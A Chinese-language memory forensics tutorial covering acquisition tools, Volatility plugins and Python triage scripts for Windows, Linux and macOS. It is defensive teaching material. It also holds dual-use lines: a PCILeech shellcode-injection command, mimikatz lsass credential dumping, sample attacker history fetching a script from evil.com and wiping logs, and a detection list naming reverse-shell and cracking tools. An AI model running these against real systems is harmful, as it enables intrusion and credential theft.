# 内存取证与Volatility实战

> 本文档系统讲解内存取证技术原理、内存获取方法、Volatility框架使用，以及Windows/Linux/macOS三大平台的内存分析技术，涵盖高级取证技巧和实战案例。

---

## 目录

1. [内存取证概述](#1-内存取证概述)
2. [内存获取方法](#2-内存获取方法)
3. [Volatility框架使用](#3-volatility框架使用)
4. [Windows内存分析](#4-windows内存分析)
5. [Linux内存分析](#5-linux内存分析)
6. [macOS内存分析](#6-macos内存分析)
7. [高级取证技巧](#7-高级取证技巧)
8. [实战案例](#8-实战案例)

---

## 1. 内存取证概述

### 1.1 什么是内存取证

内存取证（Memory Forensics）是从计算机系统物理内存中提取、分析和呈现数字证据的技术。与传统磁盘取证不同，内存取证专注于易失性数据——这些数据在系统关机或重启后会完全消失。

**内存中包含的关键证据：**

```
内存中的数字证据类型：

┌─────────────────────────────────────────────────┐
│ 1. 运行中的进程及其内存映射                       │
│ 2. 网络连接（活跃TCP/UDP连接、监听端口）          │
│ 3. 注册表hive（SYSTEM、SOFTWARE、SAM等）         │
│ 4. 已加载的内核模块和驱动                         │
│ 5. 用户凭证（明文密码、哈希、Kerberos票据）       │
│ 6. 加密密钥（BitLocker、TrueCrypt密钥）          │
│ 7. 命令行历史（bash_history、PowerShell日志）    │
│ 8. 恶意代码（无文件恶意软件、注入代码、Rootkit） │
│ 9. 进程间通信数据                               │
│ 10. 浏览器历史和缓存                            │
│ 11. 剪贴板内容                                  │
│ 12. 已打开的文件句柄                            │
└─────────────────────────────────────────────────┘
```

### 1.2 内存取证的价值

传统磁盘取证存在以下盲区，而内存取证恰好可以弥补：

| 盲区类型 | 说明 | 内存取证解决方案 |
|---------|------|----------------|
| 无文件恶意软件 | 仅存在于内存中的恶意代码，磁盘上无文件 | 直接从内存提取恶意代码 |
| 加密通信 | TLS/SSL加密的流量，磁盘上只有密文 | 内存中可获取解密后的数据 |
| 凭证窃取 | 密码在内存中可能以明文形式存在 | 提取明文密码和哈希 |
| 反取证技术 | 恶意代码修改磁盘文件来隐藏自身 | 内存中的原始数据未被篡改 |
| 运行时行为 | 磁盘取证只能看到静态文件，无法了解运行行为 | 内存中包含完整的运行时状态 |
| 加密卷 | 磁盘上的加密卷无法直接分析 | 可从内存提取加密密钥 |

### 1.3 与传统取证对比

```
┌──────────────┬──────────────────────┬──────────────────────┐
│  对比维度     │  磁盘取证             │  内存取证             │
├──────────────┼──────────────────────┼──────────────────────┤
│ 数据持久性   │ 持久（关机不丢失）    │ 易失（关机即丢失）   │
│ 数据范围     │ 文件系统中的数据      │ 运行时数据+文件数据  │
│ 恶意代码检测 │ 依赖文件签名          │ 可检测无文件恶意代码 │
│ 凭证提取     │ 仅限存储的凭证        │ 可提取运行中凭证     │
│ 加密数据处理 │ 无法解密               │ 可获取密钥和明文     │
│ 时间线分析   │ 基于文件时间戳        │ 包含精确执行时间     │
│ 反取证对抗   │ 可能被磁盘修改欺骗    │ 内存数据难以伪造     │
│ 取证操作     │ 离线分析              │ 需在线获取           │
│ 数据量       │ 通常较大（GB-TB）    │ 通常较小（4-64GB）  │
│ 完整性       │ 文件系统完整性        │ 物理内存完整性       │
└──────────────┴──────────────────────┴──────────────────────┘
```

### 1.4 取证流程

```
内存取证标准流程：

1. 获取阶段（Acquisition）
   ├── 在线获取物理内存镜像
   ├── 获取进程内存快照
   └── 记录系统状态信息

2. 保存阶段（Preservation）
   ├── 计算镜像Hash值
   ├── 安全存储和传输
   └── 维护证据链

3. 分析阶段（Analysis）
   ├── 识别运行进程和异常
   ├── 提取网络连接信息
   ├── 检测恶意代码和Rootkit
   ├── 提取凭证和密钥
   └── 关联事件时间线

4. 报告阶段（Reporting）
   ├── 整理发现
   ├── 形成取证报告
   └── 证据呈堂
```

---

## 2. 内存获取方法

### 2.1 LiME（Linux Memory Extractor）

LiME是Linux平台最常用的内存获取工具，以内核模块形式加载，能够获取完整的物理内存镜像。

**编译安装：**

```bash
# 获取LiME源码
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src

# 确保内核头文件已安装
apt install linux-headers-$(uname -r)

# 编译
make

# 生成的内核模块
ls -la lime-*.ko
```

**使用方法：**

```bash
# 加载LiME模块获取内存镜像
# 格式1：原始格式（raw）
insmod lime.ko "path=/tmp/memory.raw format=raw"

# 格式2：Lime格式（包含元数据）
insmod lime.ko "path=/tmp/memory.lime format=lime"

# 格式3：压缩格式
insmod lime.ko "path=/tmp/memory.raw format=raw compression=1"

# 通过TCP传输（适用于远程获取）
insmod lime.ko "path=tcp:4444 format=raw"

# 接收端
nc target_ip 4444 > memory.raw

# 计算Hash值
sha256sum /tmp/memory.raw > /tmp/memory.raw.sha256
```

**LiME获取原理：**

```
LiME工作原理：

1. 加载为内核模块
2. 遍历物理内存映射（/proc/iomem）
3. 逐段读取物理内存
4. 写入输出文件/网络流
5. 避免使用/proc/kcore（已被篡改风险）

优势：
- 不依赖/proc（防止被Rootkit欺骗）
- 直接读取物理内存段
- 获取完整内存镜像
- 支持网络传输
```

### 2.2 WinPmem

WinPmem是Windows平台的内存获取工具，属于Rekall项目的一部分。

**使用方法：**

```cmd
:: 下载WinPmem
:: https://github.com/Velocidex/WinPmem

:: 获取内存镜像
winpmem_mini_x64.exe /tmp/memory.raw

:: 验证Hash
certutil -hashfile /tmp/memory.raw SHA256
```

**使用Python包装：**

```python
import subprocess
import hashlib

def acquire_memory_windows(output_path):
    """Windows内存获取"""
    print("[*] Starting memory acquisition...")

    # 使用WinPmem
    cmd = ["winpmem_mini_x64.exe", output_path]
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        # 计算Hash
        sha256 = hashlib.sha256()
        with open(output_path, 'rb') as f:
            while True:
                data = f.read(65536)
                if not data:
                    break
                sha256.update(data)

        print(f"[+] Memory image saved to: {output_path}")
        print(f"[+] SHA256: {sha256.hexdigest()}")
        return True
    else:
        print(f"[-] Error: {result.stderr}")
        return False

acquire_memory_windows("C:\\forensics\\memory.raw")
```

### 2.3 PCILeech（硬件获取）

PCILeech使用FPGA硬件通过DMA（直接内存访问）获取内存，不需要在目标系统上安装任何软件，是最隐蔽的获取方式。

**硬件配置：**

```
所需硬件：
- FPGA板卡（如Squirrel, Screamer, LeetVPN等）
- USB 3.0线缆
- 目标计算机（必须有空闲PCIe插槽或Thunderbolt接口）

支持的设备：
├── Squirrel (PCIe x1)   — 可获取4GB/分钟
├── Screamer M.2         — 可获取12GB/分钟
├── LeetVPN (PCIe x4)    — 可获取12GB/分钟
└── 34AA (Thunderbolt)   — 可获取2GB/分钟
```

**使用方法：**

```bash
# 安装PCILeech
git clone https://github.com/ufrisk/pcileech.git
cd pcileech
make

# 通过FPGA获取内存
./pcileech -device fpga -memdump memory.raw

# 也可以获取特定进程内存
./pcileech -device fpga -pid 1234 -procdump process.dmp

# 获取并直接分析
./pcileech -device fpga -memdump memory.raw -volatility

# 搜索内存中的模式
./pcileech -device fpga -search "password"

# 注入代码到进程
./pcileech -device fpga -pid 1234 -inject shellcode.bin
```

**PCILeech优势：**

```
硬件获取（PCILeech）vs 软件获取对比：

┌──────────────────┬──────────────┬──────────────┐
│ 特性              │ 软件获取     │ 硬件获取     │
├──────────────────┼──────────────┼──────────────┤
│ 目标系统痕迹      │ 有           │ 无           │
│ 被Rootkit检测    │ 可能         │ 不可能       │
│ 需要权限         │ 需要         │ 不需要       │
│ 需要物理访问     │ 不需要       │ 需要         │
│ 获取速度         │ 较慢         │ 很快         │
│ 获取完整性       │ 受内核影响   │ 直接物理内存 │
│ 成本             │ 免费         │ 较高         │
└──────────────────┴──────────────┴──────────────┘
```

### 2.4 其他获取方法

**VMware虚拟机快照：**

```bash
# VMware内存获取
# 虚拟机配置文件中添加
# mainMem.useNamedFile = "TRUE"
# 然后暂停虚拟机，复制.vmem文件

# 直接从挂起文件提取
cp target-xxx.vmem /forensics/memory.raw
sha256sum /forensics/memory.raw
```

**VirtualBox：**

```bash
# VirtualBox内存获取
VBoxManage debugvm "VM_NAME" dumpvmcore --filename memory.raw

# 或使用VBoxManage
VBoxManage list runningvms
VBoxManage controlvm "VM_NAME" savestate
# 然后复制 .sav 文件
```

**KVM/QEMU：**

```bash
# 使用QEMU monitor获取
# 在QEMU monitor中执行
(qemu) pmemsave 0 0x80000000 memory.raw

# 或使用virsh
virq dumpxml VM_NAME  # 获取内存映射
virsh dump VM_NAME --memory-only --file memory.raw
```

**macOS内存获取：**

```bash
# macOS使用osxpmem
# 下载Rekall的osxpmem工具包
# https://github.com/google/rekall/releases

# 获取内存镜像
sudo osxpmem.app/osxpmem -o memory.raw

# 或使用Rekall
rekal -f memory.raw pslist
```

---

## 3. Volatility框架使用

### 3.1 安装

**Volatility 3（Python 3）：**

```bash
# 方法1：pip安装
pip3 install volatility3

# 方法2：源码安装
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
pip3 install -r requirements.txt
python3 setup.py install

# 方法3：使用Docker
docker pull volatilityfoundation/volatility3:latest
docker run --rm -v /forensics:/data volatilityfoundation/volatility3 \
  -f /data/memory.raw windows.pslist
```

**Volatility 2（Python 2，经典版本）：**

```bash
# 安装Volatility 2
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python setup.py install

# 添加符号表（ISF - Intermediate Symbol Format）
# 下载符号表到symbols目录
# https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
unzip windows.zip -d volatility3/symbols/windows/
```

### 3.2 基本命令

**Volatility 3基本命令格式：**

```bash
# 基本语法
vol -f <镜像文件> <插件>.<模块>

# 自动检测操作系统类型
vol -f memory.raw banners.Banners

# Windows分析
vol -f memory.raw windows.pslist        # 进程列表
vol -f memory.raw windows.psscan       # 进程扫描（可发现隐藏进程）
vol -f memory.raw windows.pstree       # 进程树
vol -f memory.raw windows.netscan      # 网络连接
vol -f memory.raw windows.cmdline      # 命令行参数
vol -f memory.raw windows.dlllist      # DLL列表
vol -f memory.raw windows.handles     # 句柄
vol -f memory.raw windows.registry.hivelist  # 注册表hive
vol -f memory.raw windows.registry.printkey  # 注册表键值
vol -f memory.raw windows.malfind     # 恶意代码检测
vol -f memory.raw windows.hashes      # 密码哈希
vol -f memory.raw windows.lsadump     # LSA Secrets
vol -f memory.raw windows.svcscan     # 服务
vol -f memory.raw windows.modules     # 内核模块
vol -f memory.raw windows.modscan     # 内核模块扫描
vol -f memory.raw windows.callbacks  # 回调函数
vol -f memory.raw windows.ssdt        # SSDT表
vol -f memory.raw windows.driverirp   # 驱动IRP

# Linux分析
vol -f memory.raw linux.pslist
vol -f memory.raw linux.bash
vol -f memory.raw linux.check_modules
vol -f memory.raw linux.lsof
vol -f memory.raw linux.netstat
vol -f memory.raw linux.proc_maps

# 列出所有可用插件
vol -f memory.raw --help
vol --plugins  # 查看已加载插件
```

### 3.3 插件体系

**Volatility 3插件分类：**

```
Windows插件：
├── 进程分析
│   ├── windows.pslist        — EPROCESS双向链表
│   ├── windows.psscan        — 池扫描（发现隐藏/终止进程）
│   ├── windows.pstree        — 进程树结构
│   ├── windows.psxview        — 多种方法交叉验证
│   ├── windows.cmdline        — 命令行参数
│   └── windows.dlllist        — 加载的DLL
├── 网络分析
│   ├── windows.netscan        — TCP/UDP连接
│   └── windows.netstat       — 实时网络统计
├── 注册表分析
│   ├── windows.registry.hivelist  — 注册表hive
│   ├── windows.registry.printkey  — 打印注册表键
│   ├── windows.registry.hivedump  — Hive完整转储
│   └── windows.registry.userassist — UserAssist记录
├── 凭证提取
│   ├── windows.hashes        — SAM哈希
│   ├── windows.lsadump      — LSA Secrets
│   ├── windows.cachedump    — 缓存的域凭据
│   └── windows.hashdump     — 密码哈希
├── 恶意代码检测
│   ├── windows.malfind       — 注入代码检测
│   ├── windows.apihooks      — API Hook检测
│   ├── windows.ssdt          — SSDT Hook检测
│   ├── windows.callbacks     — 内核回调检测
│   └── windows.driverirp     — IRP Hook检测
├── 文件系统
│   ├── windows.filescan     — MFT文件扫描
│   ├── windows.fileobj_scan — FILE_OBJECT扫描
│   └── windows.dumpfiles     — 提取文件
└── 其他
    ├── windows.envars        — 环境变量
    ├── windows.privileges    — 进程权限
    ├── windows.svcscan       — Windows服务
    └── windows.modules       — 内核模块

Linux插件：
├── linux.pslist              — 进程列表
├── linux.pstree              — 进程树
├── linux.bash                — Bash历史
├── linux.check_modules       — 隐藏模块检测
├── linux.lsof                — 打开文件
├── linux.netstat            — 网络连接
├── linux.proc_maps          — 进程内存映射
├── linux.tty_check          — TTY检查
└── linux.bash_env           — Bash环境变量
```

---

## 4. Windows内存分析

### 4.1 进程提取

```bash
# 进程列表
vol -f memory.raw windows.pslist

# 输出示例：
# Offset    Name                 PID    PPID   CreateTime
# 0x...     System               4      0      2024-01-15 08:00:00
# 0x...     smss.exe             264    4      2024-01-15 08:00:02
# 0x...     csrss.exe            372    360    2024-01-15 08:00:05
# 0x...     wininit.exe          392    360    2024-01-15 08:00:05
# 0x...     services.exe         668    392    2024-01-15 08:00:06
# 0x...     lsass.exe            692    392    2024-01-15 08:00:06
# 0x...     svchost.exe          860    668    2024-01-15 08:00:08

# 进程树（显示父子关系）
vol -f memory.raw windows.pstree

# 进程扫描（发现被隐藏的进程）
vol -f memory.raw windows.psscan

# 多视图交叉验证（对比不同方法的检测结果）
# Volatility 2: psxview
# Volatility 3中需要手动对比pslist和psscan

# 提取进程可执行文件
vol -f memory.raw windows.pslist --pid 1234 --dump

# 提取进程内存
vol -f memory.raw windows.memmap --pid 1234 --dump
```

**进程分析自动化脚本：**

```python
import subprocess
import json
import re

class ProcessAnalyzer:
    def __init__(self, memory_image):
        self.image = memory_image
        self.suspicious_processes = []
        self.known_good_names = {
            'System', 'smss.exe', 'csrss.exe', 'wininit.exe',
            'services.exe', 'lsass.exe', 'svchost.exe', 'explorer.exe',
            'winlogon.exe', 'fontdrvhost.exe', 'dwm.exe', 'taskhostw.exe'
        }
        self.suspicious_paths = [
            'C:\\Temp\\', 'C:\\Users\\Public\\',
            'C:\\ProgramData\\', '\\AppData\\Local\\Temp\\'
        ]

    def get_processes(self):
        """获取进程列表"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.pslist'],
            capture_output=True, text=True
        )
        return result.stdout

    def analyze_processes(self):
        """分析进程异常"""
        processes = self.get_processes()

        # 解析进程列表
        for line in processes.split('\n'):
            # 检查可疑路径
            for pattern in self.suspicious_paths:
                if pattern.lower() in line.lower():
                    self.suspicious_processes.append(
                        f"Suspicious path: {line.strip()}"
                    )

            # 检查可疑名称
            parts = line.split()
            if len(parts) > 2:
                name = parts[1]
                if name not in self.known_good_names:
                    if not name.endswith('.exe') and \
                       not name.startswith('System'):
                        self.suspicious_processes.append(
                            f"Non-standard name: {name}"
                        )

            # 检查svchost.exe的异常父进程
            if 'svchost.exe' in line:
                if 'services.exe' not in line and \
                   'svchost.exe' not in line.split()[-1:]:
                    self.suspicious_processes.append(
                        f"svchost.exe with wrong parent: {line.strip()}"
                    )

        return self.suspicious_processes

    def check_hidden_processes(self):
        """检测隐藏进程"""
        # 获取pslist结果
        pslist = subprocess.run(
            ['vol', '-f', self.image, 'windows.pslist'],
            capture_output=True, text=True
        ).stdout

        # 获取psscan结果
        psscan = subprocess.run(
            ['vol', '-f', self.image, 'windows.psscan'],
            capture_output=True, text=True
        ).stdout

        # 提取PID
        pids_pslist = set()
        pids_psscan = set()

        for line in pslist.split('\n'):
            match = re.search(r'\b(\d{1,6})\b', line)
            if match:
                pids_pslist.add(match.group(1))

        for line in psscan.split('\n'):
            match = re.search(r'\b(\d{1,6})\b', line)
            if match:
                pids_psscan.add(match.group(1))

        # 在psscan中但不在pslist中的进程
        hidden = pids_psscan - pids_pslist
        if hidden:
            print(f"[!] Hidden processes detected: {hidden}")
        else:
            print("[+] No hidden processes found")

        return hidden

if __name__ == "__main__":
    analyzer = ProcessAnalyzer("memory.raw")
    suspicious = analyzer.analyze_processes()
    for item in suspicious:
        print(f"[!] {item}")
    analyzer.check_hidden_processes()
```

### 4.2 网络连接

```bash
# 网络连接分析
vol -f memory.raw windows.netscan

# 输出示例：
# Offset     Proto  LocalAddr      LocalPort  ForeignAddr     ForeignPort  State    PID     Owner
# 0x...      TCPv4  0.0.0.0:135    135       0.0.0.0         0            LISTEN   668    svchost.exe
# 0x...      TCPv4  192.168.1.100  49152    10.0.0.5         443          ESTAB    1234   explorer.exe
# 0x...      TCPv4  0.0.0.0:4444   4444      0.0.0.0          0            LISTEN    5678   malware.exe

# 可疑网络连接特征：
# 1. 非标准端口的监听
# 2. 连接到已知恶意IP
# 3. 异常进程发起的网络连接
# 4. 数据外传的大流量连接

# 结合进程信息分析
vol -f memory.raw windows.netscan --pid 1234
```

**网络连接分析脚本：**

```python
import subprocess
import re
from collections import defaultdict

class NetworkAnalyzer:
    # 已知恶意C2 IP（示例）
    KNOWN_BAD_IPS = {
        '185.220.101.1', '45.133.1.1', '194.165.22.1'
    }

    # 可疑端口
    SUSPICIOUS_PORTS = {4444, 4445, 31337, 1234, 5555, 9999, 8888}

    def __init__(self, memory_image):
        self.image = memory_image

    def analyze_network(self):
        """分析网络连接"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.netscan'],
            capture_output=True, text=True
        )

        connections = []
        alerts = []

        for line in result.stdout.split('\n'):
            # 解析网络连接
            parts = line.split()
            if len(parts) < 8:
                continue

            proto = parts[1]
            local = parts[2]
            foreign = parts[4]
            state = parts[6]
            pid = parts[7]
            owner = parts[8] if len(parts) > 8 else "unknown"

            conn = {
                'proto': proto,
                'local': local,
                'foreign': foreign,
                'state': state,
                'pid': pid,
                'owner': owner
            }
            connections.append(conn)

            # 检查已知恶意IP
            for ip in self.KNOWN_BAD_IPS:
                if ip in foreign:
                    alerts.append(
                        f"ALERT: Connection to known bad IP {ip} by {owner} (PID {pid})"
                    )

            # 检查可疑端口
            port = foreign.split(':')[-1] if ':' in foreign else ''
            if port.isdigit() and int(port) in self.SUSPICIOUS_PORTS:
                alerts.append(
                    f"ALERT: Suspicious port {port} used by {owner} (PID {pid})"
                )

            # 检查异常监听
            if state == 'LISTEN' and owner not in [
                'svchost.exe', 'System', 'lsass.exe',
                'services.exe', 'spoolsv.exe'
            ]:
                alerts.append(
                    f"NOTICE: Non-standard process {owner} (PID {pid}) listening on {local}"
                )

        # 统计
        print(f"\n[*] Total connections: {len(connections)}")
        print(f"[*] Alerts: {len(alerts)}")
        for alert in alerts:
            print(f"  {alert}")

        return connections, alerts

if __name__ == "__main__":
    analyzer = NetworkAnalyzer("memory.raw")
    analyzer.analyze_network()
```

### 4.3 注册表分析

```bash
# 列出注册表hive
vol -f memory.raw windows.registry.hivelist

# 输出示例：
# Offset       Name                       Valid  Virtual
# 0xfffff8a0... \SystemRoot\System32\Config\SAM    True  ...
# 0xfffff8a0... \SystemRoot\System32\Config\SECURITY True ...
# 0xfffff8a0... \SystemRoot\System32\Config\SYSTEM  True ...
# 0xfffff8a0... \SystemRoot\System32\Config\SOFTWARE True ...
# 0xfffff8a0... \??\C:\Users\Admin\NTUSER.DAT      True ...

# 读取注册表键
vol -f memory.raw windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# 查看自启动项
vol -f memory.raw windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# UserAssist（程序执行记录）
vol -f memory.raw windows.registry.userassist

# 查看服务
vol -f memory.raw windows.svcscan

# 查看Shimcache（AppCompatCache）
vol -f memory.raw windows.registry.printkey \
  --key "SYSTEM\ControlSet001\Services\AppCompatCache"
```

### 4.4 凭证提取

```bash
# 提取NTLM哈希
vol -f memory.raw windows.hashes

# 输出示例：
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73e59aa7fc88687:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73e59aa7fc88687:::
# user1:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# 提取LSA Secrets
vol -f memory.raw windows.lsadump

# 提取缓存的域凭据
vol -f memory.raw windows.cachedump

# 使用mimikatz配合分析（需要提取lsass进程内存）
vol -f memory.raw windows.pslist --pid 692  # lsass PID
vol -f memory.raw windows.memmap --pid 692 --dump
# 然后使用mimikatz分析
# mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

**凭证提取自动化脚本：**

```python
import subprocess
import re
import json

class CredentialExtractor:
    def __init__(self, memory_image):
        self.image = memory_image

    def extract_ntlm_hashes(self):
        """提取NTLM哈希"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.hashes'],
            capture_output=True, text=True
        )

        hashes = []
        for line in result.stdout.split('\n'):
            # 格式: username:rid:lmhash:nthash:::
            match = re.match(
                r'^(\S+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::',
                line.strip()
            )
            if match:
                hashes.append({
                    'username': match.group(1),
                    'rid': match.group(2),
                    'lmhash': match.group(3),
                    'nthash': match.group(4)
                })

        return hashes

    def extract_lsa_secrets(self):
        """提取LSA Secrets"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.lsadump'],
            capture_output=True, text=True
        )
        return result.stdout

    def extract_cached_credentials(self):
        """提取缓存的域凭据"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.cachedump'],
            capture_output=True, text=True
        )
        return result.stdout

    def extract_all(self):
        """提取所有凭证"""
        print("=" * 60)
        print("Credential Extraction Report")
        print("=" * 60)

        # NTLM哈希
        hashes = self.extract_ntlm_hashes()
        print(f"\n[*] NTLM Hashes: {len(hashes)} found")
        for h in hashes:
            print(f"  {h['username']} (RID {h['rid']})")
            print(f"    NT: {h['nthash']}")
            # 检查空密码哈希
            if h['nthash'] == '31d6cfe0d16ae931b73e59aa7fc88687':
                print(f"    [!] Empty password")
            # 检查默认管理员哈希
            if h['username'] == 'Administrator' and \
               h['nthash'] == '31d6cfe0d16ae931b73e59aa7fc88687':
                print(f"    [!] Administrator with empty password!")

        # LSA Secrets
        lsa = self.extract_lsa_secrets()
        print(f"\n[*] LSA Secrets extracted")
        print(lsa[:500] + "..." if len(lsa) > 500 else lsa)

        # 缓存凭据
        cached = self.extract_cached_credentials()
        print(f"\n[*] Cached domain credentials:")
        print(cached[:500] + "..." if len(cached) > 500 else cached)

        return {
            'ntlm_hashes': hashes,
            'lsa_secrets': lsa,
            'cached_creds': cached
        }

if __name__ == "__main__":
    extractor = CredentialExtractor("memory.raw")
    extractor.extract_all()
```

---

## 5. Linux内存分析

### 5.1 内核模块分析

```bash
# 列出内核模块
vol -f memory.raw linux.check_modules

# 检测隐藏的内核模块
# Volatility会对比多种检测方法的结果
# 方法1：从模块链表获取（lsmod）
# 方法2：从内核内存扫描
# 方法3：从sysfs获取

# 列出内核模块
vol -f memory.raw linux.lsmod

# 检测Rootkit钩子
vol -f memory.raw linux.check_syscall
vol -f memory.raw linux.check_inline_kernel
```

**Linux内核模块检测脚本：**

```python
import subprocess
import re

class LinuxKernelAnalyzer:
    def __init__(self, memory_image):
        self.image = memory_image

    def check_modules(self):
        """检测隐藏的内核模块"""
        print("[*] Checking for hidden kernel modules...")

        # 获取模块列表
        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.check_modules'],
            capture_output=True, text=True
        )

        # 分析输出
        for line in result.stdout.split('\n'):
            if 'Hidden' in line or 'Unknown' in line:
                print(f"[!] Suspicious module: {line.strip()}")
            elif line.strip():
                print(f"  {line.strip()}")

    def check_syscall_table(self):
        """检测系统调用表Hook"""
        print("\n[*] Checking syscall table for hooks...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.check_syscall'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            if 'HOOKED' in line.upper() or 'MODIFIED' in line.upper():
                print(f"[!] Syscall hook detected: {line.strip()}")
            elif line.strip() and 'INDEX' not in line:
                print(f"  {line.strip()}")

    def analyze_kernel_modules(self):
        """完整内核分析"""
        self.check_modules()
        self.check_syscall_table()

if __name__ == "__main__":
    analyzer = LinuxKernelAnalyzer("memory.raw")
    analyzer.analyze_kernel_modules()
```

### 5.2 Bash历史

```bash
# 提取Bash历史命令
vol -f memory.raw linux.bash

# 输出示例：
# PID    Command
# 1234   cd /tmp
# 1234   wget http://evil.com/malware.sh
# 1234   chmod +x malware.sh
# 1234   ./malware.sh
# 1234   rm -rf /var/log/*
# 1234   history -c

# 提取特定进程的Bash历史
vol -f memory.raw linux.bash --pid 1234
```

### 5.3 进程信息

```bash
# 进程列表
vol -f memory.raw linux.pslist

# 进程树
vol -f memory.raw linux.pstree

# 进程打开的文件
vol -f memory.raw linux.lsof

# 进程内存映射
vol -f memory.raw linux.proc_maps --pid 1234

# 网络连接
vol -f memory.raw linux.netstat

# 进程环境变量
vol -f memory.raw linux.bash_env --pid 1234
```

**Linux进程分析脚本：**

```python
import subprocess
import re

class LinuxProcessAnalyzer:
    # 可疑命令模式
    SUSPICIOUS_COMMANDS = [
        r'wget\s+http', r'curl\s+http', r'nc\s+-', r'ncat',
        r'python\s+-c', r'perl\s+-e', r'bash\s+-i',
        r'/dev/tcp/', r'chmod\s+\+x', r'rm\s+-rf',
        r'history\s+-c', r'unset\s+HISTFILE',
        r'nmap\s+', r'hydra\s+', r'john\s+',
        r'msfconsole', r'sqlmap', r'nikto'
    ]

    def __init__(self, memory_image):
        self.image = memory_image

    def analyze_bash_history(self):
        """分析Bash历史"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.bash'],
            capture_output=True, text=True
        )

        suspicious = []
        for line in result.stdout.split('\n'):
            for pattern in self.SUSPICIOUS_COMMANDS:
                if re.search(pattern, line, re.IGNORECASE):
                    suspicious.append(line.strip())
                    break

        print(f"\n[*] Suspicious bash commands: {len(suspicious)}")
        for cmd in suspicious:
            print(f"  [!] {cmd}")

        return suspicious

    def check_network_connections(self):
        """检查网络连接"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.netstat'],
            capture_output=True, text=True
        )

        # 检查异常端口
        for line in result.stdout.split('\n'):
            if 'LISTEN' in line:
                parts = line.split()
                for part in parts:
                    if ':' in part:
                        port = part.split(':')[-1]
                        if port.isdigit():
                            p = int(port)
                            # 检查可疑端口
                            if p in {4444, 31337, 1234, 5555, 9999, 8888}:
                                print(f"  [!] Suspicious listening port: {p}")

    def analyze_all(self):
        """完整分析"""
        self.analyze_bash_history()
        self.check_network_connections()

if __name__ == "__main__":
    analyzer = LinuxProcessAnalyzer("memory.raw")
    analyzer.analyze_all()
```

---

## 6. macOS内存分析

### 6.1 进程分析

```bash
# macOS进程列表（Volatility 2 + Mac profile）
vol.py -f memory.raw --profile=MacSierra1059x64 pslist

# Volatility 3 macOS支持
vol -f memory.raw mac.pslist
vol -f memory.raw mac.pstree
vol -f memory.raw mac.psaux
```

### 6.2 网络分析

```bash
# macOS网络连接
vol -f memory.raw mac.netstat

# 查看套接字
vol -f memory.raw mac.sockets --pid 1234
```

### 6.3 Safari历史

```bash
# Safari历史记录
vol -f memory.raw mac.safari_history

# 输出示例：
# PID    URL                               VisitTime
# 5678   https://www.google.com/search?q=...  2024-01-15 10:30:00
# 5678   http://suspicious-site.com/exploit   2024-01-15 10:35:00
# 5678   https://malware-c2.com/data          2024-01-15 11:00:00
```

---

## 7. 高级取证技巧

### 7.1 恶意代码内存提取

```bash
# 检测注入代码
vol -f memory.raw windows.malfind

# 输出示例：
# PID    Process             Start            End              Tag      Protection
# 1234   explorer.exe        0x000002000000   0x000002001000   ....     PAGE_EXECUTE_READWRITE
#        MZ Header: 4D5A...
#        Disasm:
#          0x000002000000  e94b3f0000    call $+0x3f50
#          0x000002000005  6800200000    push 0x2000
#          0x00000200000a  ff15e02f0000  call [0x2fe0]

# 提取注入代码
vol -f memory.raw windows.malfind --pid 1234 --dump

# 检测API Hook
vol -f memory.raw windows.apihooks

# 输出示例：
# PID    Process             Module            Function         HookAddress  HookType
# 1234   explorer.exe        kernel32.dll      CreateFileW      0x77001234  IAT
# 1234   explorer.exe        ntdll.dll         NtCreateFile     0x77005678  Inline
```

**恶意代码提取与分析脚本：**

```python
import subprocess
import os
import hashlib

class MalwareExtractor:
    def __init__(self, memory_image, output_dir="./extracted"):
        self.image = memory_image
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def detect_injected_code(self):
        """检测注入代码"""
        print("[*] Detecting injected code...")
        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.malfind'],
            capture_output=True, text=True
        )

        injected = []
        current_pid = None
        current_process = None

        for line in result.stdout.split('\n'):
            parts = line.split()
            if len(parts) >= 3 and parts[0].isdigit():
                current_pid = parts[0]
                current_process = parts[1]
            if 'PAGE_EXECUTE' in line and 'READWRITE' in line:
                if current_pid:
                    injected.append({
                        'pid': current_pid,
                        'process': current_process,
                        'details': line.strip()
                    })
                    print(f"  [!] Injected code in {current_process} (PID {current_pid})")

        return injected

    def extract_process_memory(self, pid):
        """提取进程内存"""
        print(f"[*] Extracting memory for PID {pid}...")
        subprocess.run(
            ['vol', '-f', self.image, 'windows.memmap',
             '--pid', str(pid), '--dump',
             '--output-dir', self.output_dir],
            capture_output=True, text=True
        )

        # 查找导出的文件
        for f in os.listdir(self.output_dir):
            if f.startswith(f"pid.{pid}"):
                filepath = os.path.join(self.output_dir, f)
                sha256 = hashlib.sha256(open(filepath, 'rb').read()).hexdigest()
                print(f"  [+] Extracted: {filepath}")
                print(f"      SHA256: {sha256}")
                return filepath
        return None

    def extract_all_malware(self):
        """提取所有可疑代码"""
        injected = self.detect_injected_code()

        for item in injected:
            pid = item['pid']
            self.extract_process_memory(pid)

        # 提取所有进程的可执行文件
        print("\n[*] Extracting all process executables...")
        subprocess.run(
